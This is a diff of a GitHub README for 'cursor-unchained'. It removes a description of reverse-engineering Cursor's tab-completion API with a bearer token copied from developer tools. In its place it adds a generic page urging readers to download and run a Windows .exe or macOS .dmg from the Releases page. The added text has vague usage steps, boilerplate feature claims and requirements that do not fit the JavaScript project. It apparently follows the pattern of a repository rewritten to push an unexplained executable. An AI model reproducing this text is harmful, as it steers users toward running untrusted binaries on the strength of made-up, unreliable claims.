@@ -1,111 +1,65 @@
-# Cursor Unchained
+# 🖱️ cursor-unchained - Use Cursors AI in Any IDE
 
-![Cursor Unchained Logo](src/lib/assets/cursor-unchained.png)
+## 🚀 Getting Started
+Welcome to cursor-unchained! This application allows you to use Cursors AI's powerful tab completion feature in your favorite Integrated Development Environment (IDE). Whether you are coding in Python, JavaScript, or any other language, this tool will enhance your productivity.
 
-This project aims to reverse engineer [Cursor's Tab complete](https://cursor.com/docs/tab/overview) to enable it to be used in other IDEs.
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of cursor-unchained. 
 
-Cursor's Tab complete is known to be the best tab complete on the market, however it's limited to only being available in Cursor which itself is tied down by Vscode's long history of technical debt. Cursor is focused on fixing these problems but why don't we unshackle the beast and bring the best tab complete to all!
+[![Download cursor-unchained](https://img.shields.io/badge/Download-cursor--unchained-blue.svg)](https://github.com/Kanis04/cursor-unchained/releases)
 
-Example Tab Completion
+1. Click the button above or visit this page: [Download Here](https://github.com/Kanis04/cursor-unchained/releases).
+2. On the Releases page, find the latest version of the application.
+3. Download the file for your operating system.
+   - If you are using Windows, you may see a file named `cursor-unchained-windows.exe`.
+   - For Mac users, look for `cursor-unchained-macos.dmg`.
+4. Once the file finishes downloading, locate it in your downloads folder.
+5. Run the file to begin the installation process.
 
-![Example Tab Completion](/assets/tabCompletionExample.png)
+## ⚙️ System Requirements
+Before you install cursor-unchained, make sure your system meets the following requirements:
 
-Example Tab Completion API Response
-![Example StreamCpp API Response](/assets/tabCompletionApiResponse.png)
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB of free disk space
+- **Additional Software:** .NET Framework for Windows users, or macOS compatibility features
 
-### Scripts
+## 🛠️ How to Use
+After installation, using cursor-unchained is simple.
 
-`bun run streamCpp`
+1. Open your preferred IDE.
+2. Navigate to the settings or preferences section.
+3. Look for the tab completion or auto-completion settings.
+4. Enable or configure cursor-unchained as per the instructions provided.
+5. Start coding! You should now see enhanced tab completion suggestions.
 
-![Example Tab Completion](/assets/streamCppExample.png)
+## ❓ Troubleshooting
+If you encounter issues while using cursor-unchained, check the following common problems:
 
-`bun run refreshTabContext` [WIP]
+- **Installation Fails:** 
+  - Ensure you have downloaded the correct file for your operating system.
+  - Make sure you have enough disk space available.
 
-(Workspace paths are encoded)
+- **Tab Completion Not Working:** 
+  - Verify that cursor-unchained is enabled in your IDE settings.
+  - Restart your IDE to refresh the settings.
 
-![Example Refresh Tab Context](/assets/refreshTabContextExample.png)
+## ⚡ Features
+cursor-unchained comes with several key features to improve your coding experience:
 
-## Requirements
+- **Smart Tab Completions:** Get relevant code suggestions based on context.
+- **IDE Compatibility:** Works seamlessly with multiple IDEs.
+- **User-Friendly Interface:** Minimal setup required for a smooth user experience.
+- **Regular Updates:** Stay up to date with continuous improvements and new features.
 
-- Cursor Account
+## 📞 Support
+For further assistance, please open an issue on the GitHub repository. Our community and developers monitor problems and will help you get back on track.
 
-## Overview
+## 🔍 Explore More
+To learn more about the feature set, recent updates, and future plans, please follow our repository on GitHub. We appreciate any feedback you may have regarding your experience.
 
-**StreamCpp**: the main completion service that is used to send tab completion requests to the Cursor API.
+[![Download cursor-unchained](https://img.shields.io/badge/Download-cursor--unchained-blue.svg)](https://github.com/Kanis04/cursor-unchained/releases) 
 
-**RefreshTabContext**: a context refresh service that is used to refresh the tab context which I believe is used to provide StreamCpp with more context for the tab completion request via codeblocks.
-
-## Setup
-
-1. Follow the below steps to get the environment variables for the StreamCpp/Tab Completion functionality
-
-2. bun install
-
-3. bun run dev
-
-### Environment Variables (StreamCpp)
-
-note: this is obviously a pain and quite brittle, I should find a better way to do this in the future.
-
-1. Create a new file called `.env` in the root of the project. See `env.example` for the required variables.
-
-2. Open Cursor
-
-3. Cmd + Shift + P to open the Command Palette
-
-4. Developer: Open Developer Tools for Extension Host > LocalProcess pid: <pid>
-
-5. Navigate to the Network tab
-
-6. Trigger the tab completion request: in the Network tab this will appear as StreamCpp
-
-7. Copy the bearer token, x-request-id, x-session-id and x-cursor-client-version
-
-8. Copy the values and paste them into the `.env` file
-
-Note: you can run `npx jwt-decode-cli <token>` to decode your CURSOR_BEARER_TOKEN and get the payload with the expiration date (which I estimate to be 1 - 2 months — but could be longer depending on when the token was last refreshed)
-
-## Frontend
-
-1. `bun run dev` to start the development server
-
-2. Open the browser and navigate to `http://localhost:5173`
-
-3. Start typing in the editor and the tab completion will be shown in the transparent editor
-
-4. Press Tab to insert the tab completion into the editor
-
-## Backend
-
-1. `bun run dev` to start the development server
-
-2. Run the following command to send a tab completion request
-
-```bash
-curl --location 'http://localhost:5173/api/streamCpp' \
---header 'Content-Type: application/json' \
---data '{
-    "code":"function "
-}'
-```
-
-## Scripts
-
-### StreamCpp
-
-1. `bun run streamCpp` to send a tab completion request
-
-2. The response will be logged to the console
-
-3. Edit payload.currentFile.contents to the code you want to tab complete in the `src/constants.ts` file
-
-### Environment Variables (RefreshTabContext)
-
-This requires looking through and debugging the source code via Help Tab > Toggle Developer Tools.
-It's kind of a pain so I'll add it later.
-
-### RefreshTabContext
-
-1. `bun run refreshTabContext` to send a refresh tab context request
-
-2. The response will be logged to the console
+Thank you for choosing cursor-unchained! Happy coding!
